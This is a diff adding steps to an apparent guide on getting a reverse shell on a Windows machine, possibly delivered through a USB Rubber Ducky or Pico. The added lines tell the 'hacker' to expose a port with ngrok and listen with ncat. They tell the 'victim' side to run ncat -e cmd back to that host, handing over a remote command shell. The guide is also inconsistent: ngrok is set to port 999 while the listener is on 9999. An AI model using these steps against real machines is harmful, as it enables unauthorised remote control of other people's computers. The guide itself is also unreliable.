@@ -13,3 +13,13 @@ This is a guide on how to perform a reverse shell on Windows.
   - For set a raspberry pi pico or a USB Rubber Ducky: 
     - https://www.youtube.com/watch?v=e_f9p-_JWZw&t=949s&ab_channel=NetworkChuck
     - https://github.com/dbisu/pico-ducky
+
+> **Hacker's Computer**
+ 1. Download [Ngrok](https://ngrok.com/)
+ 2. Run ngrok 
+  - ngrok tcp 999
+ 3. Create a listener with [ncat](https://nmap.org/download.html) on another cmd
+  - ncat -lvnp 9999
+ 
+ > **Victim's Computer**
+ 1. ncat -e cmd <ngrok IP> <ngrok PORT>
